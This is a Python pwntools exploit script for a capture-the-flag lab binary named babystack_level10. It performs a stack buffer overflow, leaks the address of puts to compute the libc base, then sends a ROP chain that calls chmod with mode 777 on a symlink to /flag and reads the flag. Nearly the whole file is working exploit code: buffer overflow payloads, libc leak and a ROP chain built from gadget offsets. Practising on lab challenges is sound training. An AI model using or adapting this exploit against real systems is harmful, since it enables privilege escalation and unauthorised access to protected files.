from pwn import *
from os import system

exe = context.binary = ELF('/challenge/babystack_level10')
context.terminal = ["tmux", "splitw", "-h"]

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def rop(base):
    # ln -s /flag group for symlink to string in libc
    pop_rdi = base + 0x23b6a # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
    pop_rsi = base + 0x2601f # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
    pop_rdx = base + 0x142c92 # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
    pop_rax = base + 0x36174  # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
    syscall = base + 0x2284d  # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "syscall"

    rop = b''
    rop += p64(pop_rdi) 
    rop += p64(base + 0x1eb1f3)  #  ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "group"
    rop += p64(pop_rsi) 
    rop += p64(0o777)         # set permissions to 777
    rop += p64(pop_rdx) + p64(0)         # not used
    rop += p64(pop_rax) 
    rop += p64(0x5a)          # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "chmod"
    rop += p64(syscall)       # call syscall to execute the ROP chain
    return rop

def leak_libc():
    pop_rdi = 0x401553 
    got_puts = 0x404020
    plt_puts = 0x4010d0
    return  b''.join(map(p64, [pop_rdi, got_puts, plt_puts]))

io = start()
io.recvuntil(b'Here is the value of the base pointer rbp: ')
bp = int(io.recvline(keepends=False), 16)
io.recvuntil(b'Here is where it will be stored: ')
buf = int(io.recvline(keepends=False), 16)

new_rbp = 0x4041e8
main = 0x4014cc
exploit = cyclic(bp - buf) + p64(new_rbp) + leak_libc() + p64(main) 
print('here')
io.sendline(exploit)
print('here')
leaked_bytes = io.recvline(keepends=False)
leaked_bytes = io.recvline(keepends=False)
leaked_puts = u64(leaked_bytes.ljust(8, b"\0"))
print(f"leaked puts: 0x{leaked_puts:x}")
offset_puts = 0x84420
base_libc = leaked_puts - offset_puts

print(f"base of libc: 0x{base_libc:x}")

io.sendline(cyclic(0x190+8) + rop(base_libc))

system("cat /flag")

io.interactive()

